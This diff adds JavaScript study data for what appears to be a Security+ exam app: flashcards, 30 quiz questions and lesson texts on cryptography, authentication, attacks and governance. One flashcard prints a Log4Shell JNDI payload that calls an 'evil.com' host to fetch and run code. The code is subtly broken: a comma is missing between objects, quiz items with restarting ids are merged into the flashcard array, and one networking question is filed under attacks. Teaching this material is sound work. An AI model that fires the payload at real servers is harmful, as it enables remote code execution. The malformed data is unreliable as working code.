+<strong>GCM (Galois/Counter Mode)</strong> — encryption + built-in authentication tag. Parallelizable. Used in TLS 1.3. <strong>Current standard.</strong><br><br>
+<div class="highlight">Remember: ECB = broken, CBC = acceptable, GCM = modern standard</div>`
+  },
+  {
+    id: 4,
+    category: "AUTHENTICATION",
+    short: "<strong>FIDO2/Passkeys</strong> are the only MFA type that's truly phishing-resistant — the key won't authenticate on a fake domain.",
+    title: "FIDO2 & Passkeys",
+    body: `FIDO2 is a hardware-backed authentication standard. Physical security keys (YubiKey) or device-based passkeys implement it.<br><br>
+<div class="highlight">The key signs a cryptographic challenge that includes the actual domain. Fake domain = wrong challenge = no authentication. Phishing is architecturally impossible.</div>
+<strong>Why it beats everything else:</strong><br>
+• Attacker-in-the-middle can't intercept — domain binding breaks the attack<br>
+• Nothing to phish — no password, no OTP code<br>
+• Works even if the attacker controls the network<br><br>
+<strong>MFA hierarchy (most → least phishing resistant):</strong><br>
+FIDO2 → App TOTP → Push notification → SMS OTP`
+  },
+  {
+    id: 5,
+    category: "INCIDENT RESPONSE",
+    short: "<strong>Order of volatility</strong>: Collect RAM before disk. Fileless malware lives only in memory — reboot first and it's gone forever.",
+    title: "Order of Volatility",
+    body: `Evidence must be collected most-volatile first. Once power is cut or a system reboots, volatile data is gone permanently.<br><br>
+<strong>Order (most → least volatile):</strong><br>
+1. CPU registers & cache<br>
+2. <strong>RAM</strong> — running processes, encryption keys, fileless malware<br>
+3. Network connections & routing tables<br>
+4. Running processes<br>
+5. Disk storage<br>
+6. Remote logs<br>
+7. Physical config<br>
+8. Archival media<br><br>
+<div class="highlight">Fileless malware never touches disk. It executes entirely in RAM. Standard AV finds nothing. Memory forensics is the only detection path.</div>
+<strong>Tools:</strong> <code>LiME</code> (Linux memory acquisition), <code>Winpmem</code> (Windows)`
+  },
+  {
+    id: 6,
+    category: "NETWORK SECURITY",
+    short: "<strong>ARP Spoofing</strong>: Attacker broadcasts fake ARP replies to poison cache entries — redirecting traffic through their machine.",
+    title: "ARP Spoofing & Poisoning",
+    body: `ARP has no authentication. Anyone can send an ARP reply claiming any IP maps to their MAC.<br><br>
+<div class="highlight">Attacker sends gratuitous ARP replies: "192.168.1.1 is at MY MAC." Victims update their cache. Traffic meant for the gateway now flows through the attacker.</div>
+<strong>This enables:</strong><br>
+• Man-in-the-Middle attacks on local network<br>
+• Session hijacking<br>
+• Credential interception<br><br>
+<strong>Defenses:</strong><br>
+• <strong>Dynamic ARP Inspection (DAI)</strong> — switch validates ARP packets against DHCP snooping table<br>
+• Static ARP entries for critical hosts<br>
+• Encrypted protocols (HTTPS, SSH) — attacker sees encrypted gibberish even with MitM position`
+  },
+  {
+    id: 7,
+    category: "CRYPTOGRAPHY",
+    short: "<strong>Rainbow Table</strong> attacks use precomputed hashes. Defense: a unique random <strong>salt</strong> per password makes precomputation infeasible.",
+    title: "Rainbow Tables & Salting",
+    body: `A rainbow table is a precomputed database of <code>password → hash</code> mappings. Lookup is near-instant — no cracking needed.<br><br>
+<strong>Why salting defeats it:</strong><br>
+A salt is a random unique value added to each password before hashing.<br><br>
+<div class="highlight">Same password + different salt = completely different hash. The attacker would need a separate rainbow table for every possible salt value — computationally infeasible.</div>
+<strong>Correct password storage:</strong><br>
+• Unique random salt per user (stored alongside hash)<br>
+• Slow algorithm: <strong>bcrypt</strong>, <strong>Argon2</strong>, or <strong>scrypt</strong><br>
+• Never MD5 or SHA-1 — both broken and fast (fast = easy to brute force)`
+  },
+  {
+    id: 8,
+    category: "GOVERNANCE",
+    short: "<strong>RTO vs RPO</strong>: RTO = how fast systems must recover. RPO = how much data loss is acceptable (max backup age).",
+    title: "RTO, RPO, BCP & DRP",
+    body: `<strong>RTO (Recovery Time Objective)</strong> — maximum acceptable downtime. "We must be back online within 4 hours."<br><br>
+<strong>RPO (Recovery Point Objective)</strong> — maximum acceptable data loss measured in time. "We can't lose more than 1 hour of transactions." This determines how often you must back up.<br><br>
+<strong>BCP (Business Continuity Plan)</strong> — how the organization keeps operating during a disaster. Strategic, broad.<br><br>
+<strong>DRP (Disaster Recovery Plan)</strong> — how IT systems get restored. Technical, specific. Lives inside the BCP.<br><br>
+<div class="highlight">Exam tip: RTO = time to recover. RPO = data age tolerance. If RTO is 2hrs, your DR solution must restore in under 2hrs. If RPO is 1hr, backups must run at least hourly.</div>`
+  }
+  {
+    id: 9,
+    category: "CLOUD SECURITY",
+    short: "<strong>Shared Responsibility</strong>: In IaaS you patch the OS. In PaaS/SaaS the provider does. You ALWAYS own your data regardless of model.",
+    title: "Cloud Shared Responsibility Model",
+    body: `The shared responsibility model defines who secures what in cloud environments.<br><br>
+<strong>SaaS</strong> — provider owns everything down to the application. You own data and user access only.<br><br>
+<strong>PaaS</strong> — provider owns hardware and OS. You own the application and data.<br><br>
+<strong>IaaS</strong> — provider owns physical hardware. You own OS, middleware, application, and data.<br><br>
+<div class="highlight">The OS is the key differentiator. IaaS = you patch it. PaaS/SaaS = provider patches it. This is a favorite exam question.</div>
+<strong>Customer always owns their data.</strong> No matter what model — data responsibility never transfers to the provider.`
+  },
+  {
+    id: 10,
+    category: "APP SECURITY",
+    short: "<strong>Log4Shell</strong>: Attackers sent one line in any logged field and got remote code execution on millions of servers. Zero auth required.",
+    title: "Log4Shell — CVE-2021-44228",
+    body: `Log4j is a Java logging library embedded in millions of applications. The vulnerability allowed attackers to embed executable instructions inside log messages.<br><br>
+<div class="highlight">Sending <code>${"$"}{jndi:ldap://evil.com/x}</code> in a username field, HTTP header, or search box caused the server to fetch and execute attacker-controlled code automatically.</div>
+<strong>Why it was catastrophic:</strong><br>
+• Log4j was a dependency inside thousands of products — many teams didn't know they were running it<br>
+• Exploitable via any input that got logged<br>
+• Zero authentication required<br>
+• Trivially simple to execute<br><br>
+This is OWASP #6 — <strong>Vulnerable and Outdated Components</strong>. The library had the flaw. Every application using it inherited the risk.`
+  },
+  {
+    id: 11,
+    category: "IDENTITY & ACCESS",
+    short: "<strong>Kerberoasting</strong>: Attacker requests service tickets then cracks them offline to recover service account passwords. No admin rights needed.",
+    title: "Kerberos Attacks",
+    body: `Kerberos is secure by design but has well-known attack paths:<br><br>
+<strong>Kerberoasting</strong> — any authenticated domain user can request service tickets. Tickets are encrypted with the service account's password hash. Attacker requests tickets, takes them offline, brute forces the hash. Service accounts often have weak passwords and never expire.<br><br>
+<strong>Pass the Ticket</strong> — steal a valid TGT or service ticket from memory on a compromised host. Reuse it to authenticate as that user. Valid until ticket expires (default 10 hours).<br><br>
+<strong>Golden Ticket</strong> — attacker compromises the KDC and obtains the KRBTGT account hash. Can now forge TGTs for any user including domain admins. Persists even after password resets.<br><br>
+<div class="highlight">Golden Ticket = complete domain compromise. The only remediation is resetting KRBTGT password twice and rebuilding trust.</div>`
+  },
+  {
+    id: 12,
+    category: "APP SECURITY",
+    short: "<strong>SAST</strong> reads code without running it. <strong>DAST</strong> attacks the running app from outside. Like reading a recipe vs eating the food.",
+    title: "SAST vs DAST vs IAST",
+    body: `<strong>SAST (Static Application Security Testing)</strong><br>
+Analyzes source code without executing it. Finds vulnerabilities by reading — hardcoded credentials, insecure functions, injection risks. Runs early in development. Can't find runtime issues.<br><br>
+<strong>DAST (Dynamic Application Security Testing)</strong><br>
+Tests the running application from outside like an attacker. No source code needed. Finds authentication flaws, misconfigurations, real injection responses. Runs during testing/staging.<br><br>
+<strong>IAST (Interactive AST)</strong><br>
+Agents embedded inside the running application monitor it during testing. Best coverage, most complex to deploy.<br><br>
+<div class="highlight">SDLC placement: SAST early (coding) → IAST during QA → DAST late (staging). Security+ expects you to know which finds what.</div>`
+  },
+  {
+    id: 1,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker sends thousands of half-open TCP connection requests to a web server, never completing the handshake. The server becomes overwhelmed. What attack is this?",
+    options: ["Ping of Death", "SYN Flood", "Smurf Attack", "DNS Amplification"],
+    correct: 1,
+    explanation: "<strong>SYN Flood</strong> exploits the TCP three-way handshake. The server allocates resources for each SYN, sends SYN-ACK, and waits for an ACK that never comes. Enough half-open connections fill the table. Defense: <strong>SYN cookies</strong>."
+  },
+  {
+    id: 2,
+    domain: "IMPLEMENTATION",
+    text: "Which of the following BEST describes the difference between an IDS and an IPS?",
+    options: ["IDS blocks traffic, IPS only alerts", "IDS is hardware, IPS is software", "IDS detects and alerts, IPS detects and blocks", "IDS is at Layer 7, IPS at Layer 3"],
+    correct: 2,
+    explanation: "<strong>IDS</strong> = Intrusion Detection System — passive, alerts only. <strong>IPS</strong> = Intrusion Prevention System — inline, actively blocks malicious traffic. Position in network differs: IDS out-of-band, IPS inline."
+  },
+  {
+    id: 3,
+    domain: "THREATS & ATTACKS",
+    text: "A network administrator notices that two OSPF routers are stuck in EXSTART state. What is the MOST likely cause?",
+    options: ["Mismatched Hello timers", "Mismatched MTU", "Mismatched area IDs", "Mismatched OSPF process IDs"],
+    correct: 1,
+    explanation: "<strong>MTU mismatch</strong> is the classic Exstart killer. Routers have confirmed they see each other (2-Way) but DBD packet size mismatch causes silent drops during exchange. Area ID mismatch would prevent reaching 2-Way at all."
+  },
+  {
+    id: 4,
+    domain: "IMPLEMENTATION",
+    text: "A company stores user passwords by hashing with SHA-256. An attacker obtains the database and recovers passwords using precomputed hash tables. What attack technique was used?",
+    options: ["Brute Force", "Rainbow Table Attack", "Dictionary Attack", "Pass the Hash"],
+    correct: 1,
+    explanation: "<strong>Rainbow Table</strong> attacks use precomputed hash databases for near-instant lookups. Defense: unique random <strong>salt</strong> per password before hashing — makes precomputed tables useless. Use bcrypt or Argon2."
+  },
+  {
+    id: 5,
+    domain: "THREATS & ATTACKS",
+    text: "A user receives a text message appearing to be from their bank asking them to verify their account. What attack type is this?",
+    options: ["Vishing", "Phishing", "Smishing", "Pharming"],
+    correct: 2,
+    explanation: "<strong>Smishing</strong> = SMS + phishing. Channel determines the name: Email = phishing, SMS = smishing, Phone call = vishing. The exam will test whether you identify the delivery channel."
+  },
+  {
+    id: 6,
+    domain: "IMPLEMENTATION",
+    text: "Which WPA3 feature ensures captured wireless traffic cannot be decrypted even if the network password is obtained later?",
+    options: ["AES-CCMP encryption", "Pre-Shared Key authentication", "Simultaneous Authentication of Equals", "Forward Secrecy"],
+    correct: 3,
+    explanation: "<strong>Forward Secrecy</strong> — each session generates ephemeral keys that are discarded after the session. Past traffic stays encrypted forever even if the password is later compromised. SAE is the mechanism, Forward Secrecy is the property."
+  },
+  {
+    id: 7,
+    domain: "ARCHITECTURE",
+    text: "A company requires that no single employee can complete a critical financial transaction alone — a second employee must approve it. What security principle is this?",
+    options: ["Least Privilege", "Separation of Duties", "Need to Know", "Defense in Depth"],
+    correct: 1,
+    explanation: "<strong>Separation of Duties</strong> prevents any single person from having enough access to commit fraud or errors undetected. Also called two-person integrity. Common in finance and privileged IT access."
+  },
+  {
+    id: 8,
+    domain: "OPERATIONS",
+    text: "A security analyst discovers employee credentials for sale on a dark web marketplace. Which incident response phase does INITIAL discovery represent?",
+    options: ["Preparation", "Identification", "Containment", "Eradication"],
+    correct: 1,
+    explanation: "<strong>Identification</strong> — detecting and confirming the incident. The PICERL model: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. Dark web discovery is the identification trigger."
+  },
+  {
+    id: 9,
+    domain: "IMPLEMENTATION",
+    text: "Which protocol adds digital signatures to DNS records to protect against DNS cache poisoning?",
+    options: ["DNSSEC", "DoH", "LDAPS", "STARTTLS"],
+    correct: 0,
+    explanation: "<strong>DNSSEC</strong> adds cryptographic signatures proving DNS records are authentic and unmodified. <strong>DoH</strong> (DNS over HTTPS) encrypts queries for privacy — different problem. LDAPS secures directory queries. STARTTLS upgrades SMTP to encrypted."
+  },
+  {
+    id: 10,
+    domain: "THREATS & ATTACKS",
+    text: "A penetration tester is hired and given no information about the target environment. What type of test is this?",
+    options: ["White Box", "Grey Box", "Black Box", "Crystal Box"],
+    correct: 2,
+    explanation: "<strong>Black box</strong> = no prior knowledge, simulates external attacker. <strong>White box</strong> = full knowledge (diagrams, credentials). <strong>Grey box</strong> = partial knowledge, simulates insider threat. Most realistic → least: Black → Grey → White."
+  },
+  {
+    id: 11,
+    domain: "IMPLEMENTATION",
+    text: "A security team wants to limit lateral movement if one system is compromised. Which principle DIRECTLY addresses this?",
+    options: ["Defense in Depth", "Zero Trust", "Network Segmentation", "Least Privilege"],
+    correct: 2,
+    explanation: "<strong>Network Segmentation</strong> — physically or logically dividing the network so a compromise in one segment can't reach others. VLANs, firewalls, and micro-segmentation implement this. Zero Trust is broader (verify everything), segmentation is the specific control for lateral movement."
+  },
+  {
+    id: 12,
+    domain: "IMPLEMENTATION",
+    text: "Which cryptographic concept ensures a sender cannot deny having sent a message?",
+    options: ["Confidentiality", "Integrity", "Non-repudiation", "Authentication"],
+    correct: 2,
+    explanation: "<strong>Non-repudiation</strong> achieved through digital signatures. Asymmetric crypto proves the message came from a specific private key holder. Since only you have your private key, you cannot deny signing it."
+  },
+  {
+    id: 13,
+    domain: "GOVERNANCE",
+    text: "A company purchases cyber insurance to cover financial losses from a data breach. What risk strategy is this?",
+    options: ["Risk Mitigation", "Risk Avoidance", "Risk Acceptance", "Risk Transference"],
+    correct: 3,
+    explanation: "<strong>Risk Transference</strong> — shifting the financial impact to another party. Cyber insurance is the classic example. The organization still owns the operational risk but the financial burden transfers to the insurer."
+  },
+  {
+    id: 14,
+    domain: "THREATS & ATTACKS",
+    text: "Malware executes entirely in RAM and writes nothing to disk. Traditional signature-based AV finds no trace. What type of malware is this?",
+    options: ["Rootkit", "Ransomware", "Fileless Malware", "Worm"],
+    correct: 2,
+    explanation: "<strong>Fileless malware</strong> lives exclusively in RAM. No files = no file signatures = traditional AV blind. Detection requires behavioral analysis and memory scanning. This is why memory dumps must be captured before rebooting during incident response."
+  },
+  {
+    id: 15,
+    domain: "IMPLEMENTATION",
+    text: "A company encrypts each data block independently with the same key. A security auditor flags this as critical. Which mode is being used?",
+    options: ["CBC — predictable IV", "GCM — lacks authentication", "ECB — identical plaintext produces identical ciphertext", "CTR — keystream reuse"],
+    correct: 2,
+    explanation: "<strong>ECB (Electronic Codebook)</strong> — each block encrypted independently. Identical plaintext blocks = identical ciphertext blocks. Patterns in data survive encryption. The famous encrypted penguin logo remains recognizable. Never use ECB."
+  },
+  {
+    id: 16,
+    domain: "GOVERNANCE",
+    text: "Which document provides step-by-step technical instructions for implementing a security policy?",
+    options: ["Policy", "Standard", "Procedure", "Guideline"],
+    correct: 2,
+    explanation: "<strong>Procedure</strong> — specific step-by-step how-to instructions. <strong>Policy</strong> = what must be done and why (executive level). <strong>Standard</strong> = mandatory technical requirements that fulfill the policy. <strong>Guideline</strong> = recommended, not mandatory."
+  },
+  {
+    id: 17,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker registers the domain 'micros0ft.com' to capture traffic from users who mistype the real domain. What technique is this?",
+    options: ["Pharming", "Typosquatting", "DNS Poisoning", "URL Hijacking"],
+    correct: 1,
+    explanation: "<strong>Typosquatting</strong> (also called URL hijacking) — registering domains that visually resemble legitimate ones, exploiting common typos. Different from pharming which redirects legitimate DNS to malicious IPs."
+  },
+  {
+    id: 18,
+    domain: "OPERATIONS",
+    text: "During forensic investigation, a responder needs to collect evidence from a live system. In what order should evidence be collected?",
+    options: ["Disk → RAM → Network connections", "RAM → Network connections → Disk", "Network connections → Disk → RAM", "All simultaneously"],
+    correct: 1,
+    explanation: "<strong>Order of volatility</strong> — most volatile first. RAM disappears on reboot. Network connections are next. Disk persists longest. RAM may contain fileless malware, encryption keys, and running processes not visible on disk."
+  },
+  {
+    id: 19,
+    domain: "IMPLEMENTATION",
+    text: "Which authentication protocol is considered MOST resistant to phishing attacks?",
+    options: ["SMS OTP", "TOTP Authenticator App", "Push Notification MFA", "FIDO2 Hardware Key"],
+    correct: 3,
+    explanation: "<strong>FIDO2</strong> is cryptographically domain-bound. The key signs a challenge including the actual domain — a fake site's domain won't match, authentication fails. Phishing is architecturally impossible, not just harder. SMS is weakest (SIM swap vulnerable)."
+  },
+  {
+    id: 20,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker already has a user's password and repeatedly sends MFA push notifications until the user approves one. What attack is this?",
+    options: ["Credential Stuffing", "Pass the Hash", "MFA Fatigue", "Replay Attack"],
+    correct: 2,
+    explanation: "<strong>MFA Fatigue</strong> — overwhelming a user with push notifications until they approve one to stop the alerts. Uber 2022 breach used this exact technique. Defense: number matching, contextual push info, or FIDO2."
+  },
+  {
+    id: 21,
+    domain: "ARCHITECTURE",
+    text: "A company implements controls at the network, endpoint, application, and data layers. What principle does this represent?",
+    options: ["Zero Trust", "Least Privilege", "Defense in Depth", "Separation of Duties"],
+    correct: 2,
+    explanation: "<strong>Defense in Depth</strong> — multiple overlapping security layers. If one fails, others remain. No single point of failure. Keyword: layers across multiple levels of the environment."
+  },
+  {
+    id: 22,
+    domain: "IMPLEMENTATION",
+    text: "A VPN user at a coffee shop has personal file sharing running simultaneously that routes outside the VPN tunnel. What is this called?",
+    options: ["Man in the Middle", "Split Tunneling", "DNS Poisoning", "Session Hijacking"],
+    correct: 1,
+    explanation: "<strong>Split Tunneling</strong> — some traffic through VPN, some direct to internet. Convenient but dangerous: personal traffic bypasses corporate security controls and is exposed on untrusted networks. Fix: disable split tunneling, force all traffic through VPN."
+  },
+  {
+    id: 23,
+    domain: "THREATS & ATTACKS",
+    text: "Malware self-replicates and spreads across networks automatically with no human interaction required. What type of malware is this?",
+    options: ["Virus", "Worm", "Trojan", "Rootkit"],
+    correct: 1,
+    explanation: "<strong>Worm</strong> — self-replicating, spreads autonomously with zero human interaction. No host file needed. Virus requires human action to spread (running an infected file). WannaCry was a worm — spread globally by exploiting a Windows vulnerability automatically."
+  },
+  {
+    id: 24,
+    domain: "GOVERNANCE",
+    text: "What is the maximum acceptable downtime for a system called?",
+    options: ["RPO", "RTO", "BCP", "MTTR"],
+    correct: 1,
+    explanation: "<strong>RTO (Recovery Time Objective)</strong> — maximum acceptable downtime. How fast must systems be back online? <strong>RPO</strong> = maximum acceptable data loss measured in time. Remember: RTO = Time to recover, RPO = Point in time for data."
+  },
+  {
+    id: 25,
+    domain: "THREATS & ATTACKS",
+    text: "An advanced attacker has maintained silent access to a network for 8 months, slowly exfiltrating data without triggering alerts. What threat category is this?",
+    options: ["Insider Threat", "APT — Advanced Persistent Threat", "Zero Day Attack", "Ransomware"],
+    correct: 1,
+    explanation: "<strong>APT (Advanced Persistent Threat)</strong> — long-term, stealthy, targeted. Goal is persistence and intelligence gathering, not immediate disruption. Often nation-state sponsored. Making noise defeats the purpose. Examples: Stuxnet, APT28 (Fancy Bear)."
+  },
+  {
+    id: 26,
+    domain: "IMPLEMENTATION",
+    text: "Which email security protocol cryptographically signs DNS records to prove an email domain is authorized to send mail?",
+    options: ["SPF", "DKIM", "DMARC", "S/MIME"],
+    correct: 1,
+    explanation: "<strong>DKIM (DomainKeys Identified Mail)</strong> adds a cryptographic signature to emails, verified via DNS. <strong>SPF</strong> specifies authorized sending IPs. <strong>DMARC</strong> uses both SPF and DKIM and defines policy for failures. Together they combat email spoofing."
+  },
+  {
+    id: 27,
+    domain: "ARCHITECTURE",
+    text: "A security model where no user or device is trusted by default, even inside the network perimeter, is called:",
+    options: ["Defense in Depth", "Zero Trust", "Network Segmentation", "Least Privilege"],
+    correct: 1,
+    explanation: "<strong>Zero Trust</strong> — 'never trust, always verify.' Every access request is authenticated and authorized regardless of network location. Assumes breach. Eliminates implicit trust based on being inside the network perimeter."
+  },
+  {
+    id: 28,
+    domain: "OPERATIONS",
+    text: "A SIEM generates 10,000 alerts daily. Which technology automates responses to high-confidence, low-complexity alerts without human intervention?",
+    options: ["IDS", "DLP", "SOAR", "WAF"],
+    correct: 2,
+    explanation: "<strong>SOAR (Security Orchestration Automation and Response)</strong> — takes SIEM alerts and automates response actions. Block IP at firewall, disable account, isolate endpoint — no human needed for clear-cut cases. Humans handle what automation can't."
+  },
+  {
+    id: 29,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker hides secret data inside an image file that appears normal when viewed. No execution occurs. What technique is this?",
+    options: ["Steganography", "Cryptography", "Obfuscation", "Rootkit"],
+    correct: 0,
+    explanation: "<strong>Steganography</strong> — hiding the existence of data inside other data. The image is not malicious and nothing executes. It's concealment, not encryption. Cryptography hides the meaning; steganography hides the existence. Both together = very hard to detect."
+  },
+  {
+    id: 30,
+    domain: "IMPLEMENTATION",
+    text: "Which hashing algorithm is currently considered secure and is widely used in TLS and digital certificates?",
+    options: ["MD5", "SHA-1", "SHA-256", "DES"],
+    correct: 2,
+    explanation: "<strong>SHA-256</strong> (part of SHA-2 family) — current standard, considered secure. MD5 and SHA-1 are both broken — collision attacks are practical. DES is an encryption algorithm, not a hash. SHA-3 is also secure and acceptable."
+  }
+];
+
+const LESSONS = [
+  {
+    id: 1,
+    icon: "🔐",
+    title: "Cryptography Fundamentals",
+    meta: "IMPLEMENTATION · 15 min",
+    status: "active",
+    content: `
+      <h3>SYMMETRIC VS ASYMMETRIC</h3>
+      <strong>Symmetric encryption</strong> uses one shared secret key for both encryption and decryption. Fast. The problem: how do you securely share that key in the first place?<br><br>
+      <strong>Asymmetric encryption</strong> uses a key pair — public key encrypts, private key decrypts. The private key never moves. Solves key distribution but is computationally slow.<br><br>
+      <div class="highlight">TLS combines both: asymmetric to securely exchange a symmetric session key, symmetric for all data after. Best of both worlds.</div>
+      
+      <h3>KEY ALGORITHMS</h3>
+      • <strong>AES</strong> — symmetric block cipher, 128/192/256-bit keys. Gold standard.<br>
+      • <strong>RSA</strong> — asymmetric, minimum 2048-bit. Used in TLS, certificates.<br>
+      • <strong>ECDH/ECDHE</strong> — elliptic curve variant, smaller keys, faster math.<br><br>
+      
+      <h3>AES MODES</h3>
+      • <strong>ECB</strong> — each block independent. BROKEN. Never use.<br>
+      • <strong>CBC</strong> — blocks chained via XOR. Needs IV. Acceptable.<br>
+      • <strong>GCM</strong> — encryption + authentication. TLS 1.3 standard.<br><br>
+      
+      <h3>HASHING</h3>
+      One-way. Cannot be reversed. Used for integrity and password storage.<br><br>
+      • <strong>MD5</strong> — broken, collision attacks trivial<br>
+      • <strong>SHA-1</strong> — deprecated, broken<br>
+      • <strong>SHA-256/SHA-3</strong> — current standard<br>
+      • <strong>bcrypt/Argon2</strong> — intentionally slow, for passwords<br><br>
+      <div class="highlight">Passwords = hash + unique salt. Salt defeats rainbow tables. Slow algorithm defeats brute force.</div>
+    `
+  },
+  {
+    id: 2,
+    icon: "🎭",
+    title: "Attack Types & Vectors",
+    meta: "THREATS & ATTACKS · 20 min",
+    status: "active",
+    content: `
+      <h3>SOCIAL ENGINEERING</h3>
+      • <strong>Phishing</strong> — mass email bait<br>
+      • <strong>Spear Phishing</strong> — targeted, researched victim<br>
+      • <strong>Whaling</strong> — C-suite targets<br>
+      • <strong>Smishing</strong> — SMS delivery<br>
+      • <strong>Vishing</strong> — voice/phone call<br>
+      • <strong>Pharming</strong> — DNS redirect to fake site<br>
+      • <strong>Typosquatting</strong> — fake domains exploiting typos<br><br>
+      
+      <h3>MALWARE TYPES</h3>
+      • <strong>Virus</strong> — needs host file + human action to spread<br>
+      • <strong>Worm</strong> — self-replicating, spreads autonomously<br>
+      • <strong>Rootkit</strong> — hides itself and other malware, persistence + stealth<br>
+      • <strong>Fileless Malware</strong> — RAM only, no disk footprint, evades AV<br>
+      • <strong>Ransomware</strong> — encrypts files, demands payment<br>
+      • <strong>RAT</strong> — Remote Access Trojan, full remote control<br><br>
+      
+      <h3>NETWORK ATTACKS</h3>
+      • <strong>SYN Flood</strong> — half-open TCP connections exhaust server table<br>
+      • <strong>DDoS</strong> — distributed flood from botnet, multiple sources<br>
+      • <strong>ARP Spoofing</strong> — fake ARP replies poison cache, enables MitM<br>
+      • <strong>MitM</strong> — attacker intercepts and relays communications<br><br>
+      
+      <div class="highlight">APT (Advanced Persistent Threat) — long-term, stealthy, targeted. Often nation-state. Goal: persistence and intelligence, not disruption.</div>
+    `
+  },
+  {
+    id: 3,
+    icon: "🏛️",
+    title: "PKI & Certificates",
+    meta: "IMPLEMENTATION · 12 min",
+    status: "active",
+    content: `
+      <h3>THE TRUST PROBLEM</h3>
+      When a server sends you its public key, how do you know it's really from that server and not an attacker? <strong>Certificate Authorities (CAs)</strong> solve this.<br><br>
+      
+      <h3>CHAIN OF TRUST</h3>
+      • <strong>Root CA</strong> — ultimate trust anchor, kept offline<br>
+      • <strong>Intermediate CA</strong> — signs certs on behalf of root, limits exposure<br>
+      • <strong>End Entity Certificate</strong> — what websites present to you<br><br>
+      
+      <div class="highlight">Your browser ships with trusted Root CAs pre-installed. Any cert signed by one of them gets the padlock. Any CA compromised = internet trust broken.</div>
+      
+      <h3>CERTIFICATE TRANSPARENCY</h3>
+      All public certs must be logged in append-only public logs. Browsers verify certs appear there. Fraudulently issued certs that skip logging get flagged.<br><br>
+      
+      <h3>REVOCATION</h3>
+      • <strong>CRL</strong> — Certificate Revocation List, periodic download<br>
+      • <strong>OCSP</strong> — Online Certificate Status Protocol, real-time check<br><br>
+      
+      <h3>TLS HANDSHAKE</h3>
+      1. Client hello — supported cipher suites<br>
+      2. Server sends certificate (contains public key)<br>
+      3. Client verifies cert via CA chain<br>
+      4. Key exchange (ECDHE in TLS 1.3)<br>
+      5. Both derive symmetric session key<br>
+      6. Encrypted communication begins
+    `
+  },
+  {
+    id: 4,
+    icon: "🚨",
+    title: "Incident Response",
+    meta: "OPERATIONS · 10 min",
+    status: "active",
+    content: `
+      <h3>PICERL MODEL</h3>
+      <strong>P</strong>reparation → <strong>I</strong>dentification → <strong>C</strong>ontainment → <strong>E</strong>radication → <strong>R</strong>ecovery → <strong>L</strong>essons Learned<br><br>
+      
+      • <strong>Preparation</strong> — IR plan, tools, team in place before anything happens<br>
+      • <strong>Identification</strong> — detect and confirm the incident<br>
+      • <strong>Containment</strong> — stop the bleeding (short-term isolation, then long-term hardening)<br>
+      • <strong>Eradication</strong> — remove malware, close backdoors, reset credentials<br>
+      • <strong>Recovery</strong> — restore to normal, monitor for reinfection<br>
+      • <strong>Lessons Learned</strong> — post-mortem, improve defenses<br><br>
+      
+      <h3>ORDER OF VOLATILITY</h3>
+      Collect most volatile first. RAM → Network connections → Disk.<br><br>
+      <div class="highlight">Fileless malware = RAM only. Pull the plug first = evidence gone forever. Memory dump before anything else.</div>
+      
+      <h3>CHAIN OF CUSTODY</h3>
+      Evidence must be handled forensically from discovery. Documented, unmodified, admissible in court. Use write blockers when imaging drives.<br><br>
+      
+      <h3>LEGAL OBLIGATIONS</h3>
+      Breach notification laws exist (GDPR, PIPEDA in Canada). Timelines apply. Failure to notify = fines.
+    `
+  },
+  {
+    id: 5,
+    icon: "📋",
+    title: "Governance, Risk & Compliance",
+    meta: "GOVERNANCE · 10 min",
+    status: "active",
+    content: `
+      <h3>POLICY HIERARCHY</h3>
+      • <strong>Policy</strong> — what and why, executive level, mandatory<br>
+      • <strong>Standard</strong> — specific mandatory technical requirements fulfilling policy<br>
+      • <strong>Procedure</strong> — step-by-step how-to instructions<br>
+      • <strong>Guideline</strong> — recommended best practices, NOT mandatory<br><br>
+      
+      <h3>RISK STRATEGIES</h3>
+      • <strong>Mitigation</strong> — reduce the risk (patch, harden, fix)<br>
+      • <strong>Acceptance</strong> — acknowledge and live with it<br>
+      • <strong>Transference</strong> — shift financial impact (cyber insurance)<br>
+      • <strong>Avoidance</strong> — eliminate the activity causing the risk<br><br>
+      
+      <h3>BCP & DRP</h3>
+      • <strong>BCP</strong> — Business Continuity Plan: keep operating during disaster<br>
+      • <strong>DRP</strong> — Disaster Recovery Plan: restore IT systems (lives inside BCP)<br><br>
+      
+      <div class="highlight">RTO = max acceptable downtime. RPO = max acceptable data loss (determines backup frequency).</div>
+      
+      <h3>SECURITY PRINCIPLES</h3>
+      • <strong>Least Privilege</strong> — minimum access needed<br>
+      • <strong>Separation of Duties</strong> — no single person can complete critical actions alone<br>
+      • <strong>Defense in Depth</strong> — layered controls, no single point of failure<br>
+      • <strong>Zero Trust</strong> — never trust, always verify
+    `
+  },
+  {
+    id: 7,
+    icon: "☁️",
+    title: "Cloud Security",
+    meta: "ARCHITECTURE · 12 min",
+    status: "active",
+    content: `
+      <h3>SERVICE MODELS</h3>
+      • <strong>SaaS</strong> — provider owns everything. You own your data only. Gmail, Office 365, Salesforce.<br>
+      • <strong>PaaS</strong> — provider owns hardware + OS. You own application + data. Heroku, Google App Engine.<br>
+      • <strong>IaaS</strong> — provider owns hardware. You own OS, middleware, application, data. AWS EC2, Azure VMs.<br><br>
+      
+      <div class="highlight">Key rule: Customer ALWAYS owns their data regardless of model. OS is the differentiator — IaaS you patch it, PaaS/SaaS the provider does.</div>
+      
+      <h3>CLOUD-SPECIFIC THREATS</h3>
+      • <strong>Misconfigured storage buckets</strong> — S3 buckets left public. Entire databases exposed accidentally<br>
+      • <strong>Insecure APIs</strong> — cloud is API driven. Every misconfigured API is an attack surface<br>
+      • <strong>Account hijacking</strong> — compromise one cloud admin account = own everything<br>
+      • <strong>Shadow IT</strong> — employees spinning up cloud resources without IT visibility<br>
+      • <strong>Shared infrastructure</strong> — your data on hardware shared with other customers<br><br>
+      
+      <h3>CLOUD DEPLOYMENT MODELS</h3>
+      • <strong>Public cloud</strong> — shared infrastructure, provider owned (AWS, Azure, GCP)<br>
+      • <strong>Private cloud</strong> — dedicated infrastructure, org owned or hosted<br>
+      • <strong>Hybrid cloud</strong> — mix of both, common in enterprise<br>
+      • <strong>Community cloud</strong> — shared between organizations with common interests<br><br>
+      
+      <h3>CASB</h3>
+      <strong>Cloud Access Security Broker</strong> — sits between users and cloud services, enforces security policies, provides visibility into cloud usage including shadow IT.
+    `
+  },
+  {
+    id: 8,
